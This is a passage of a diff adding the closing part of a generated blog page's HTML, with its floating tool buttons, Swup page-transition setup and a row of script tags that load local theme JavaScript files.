+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
